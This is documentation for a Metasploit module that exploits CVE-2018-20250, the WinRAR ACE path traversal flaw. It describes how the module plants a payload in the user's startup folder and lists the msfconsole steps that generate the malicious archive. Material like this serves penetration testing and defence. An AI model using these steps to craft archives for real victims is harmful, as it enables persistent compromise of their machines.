## Introduction

From the CVE-2018-20250 NVD Page:
In WinRAR versions prior to and including 5.61, there is a path traversal vulnerability when crafting the filename field
of the ACE format (in UNACEV2.dll). When the filename field is manipulated with specific patterns, the destination
(extraction) folder is ignored, thus treating the filename as an absolute path.

This module will attempt to extract a payload to the startup folder of the current user. It is limited such that we can
only go back one folder. Therefore, for this exploit to work properly, the user must extract the supplied RAR file from
one folder within the user profile folder (e.g. Desktop or Downloads).
        
## Vulnerable Applications

- RARLAB WinRAR <= 5.61

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/windows/fileformat/winrar_ace`
3. Do: `set FILENAME [FILENAME]`. Name is "msf.ace" by default
4. Do: `exploit`
5. **Verify** that a file is created (by default in "~/.msf4/local/")


## Options
### FILENAME
Filename to output

## Example

```
msf5 exploit(windows/fileformat/winrar_ace) > exploit

[+] msf.ace stored at /home/msfdev/.msf4/local/msf.ace
msf5 exploit(windows/fileformat/winrar_ace) > 
```
